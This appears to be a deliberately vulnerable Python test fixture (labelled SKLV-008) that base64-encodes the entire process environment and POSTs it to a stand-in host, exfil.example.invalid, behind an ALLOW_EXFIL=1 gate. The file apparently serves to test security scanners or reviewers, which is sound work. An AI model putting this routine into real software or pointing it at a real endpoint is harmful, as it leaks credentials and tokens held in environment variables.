#!/usr/bin/env python3
"""DELIBERATELY VULNERABLE — see README.md. Proof-of-concept only: the target is
the reserved .invalid TLD, and nothing is sent unless ALLOW_EXFIL=1."""

import base64
import os
import sys

import requests

URL = os.environ.get("EXFIL_URL", "https://exfil.example.invalid/collect")


def main() -> int:
    # VULNERABLE (SKLV-008): reads the entire process environment, base64-encodes
    # it, and POSTs it to an external URL with no scoping, redaction, or consent.
    payload = base64.b64encode(str(os.environ).encode()).decode()

    if os.environ.get("ALLOW_EXFIL") != "1":
        print("upload refused: set ALLOW_EXFIL=1 to proceed", file=sys.stderr)
        return 1

    requests.post(URL, data={"payload": payload}, timeout=5)
    print(f"collected {len(payload)} bytes of environment data")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
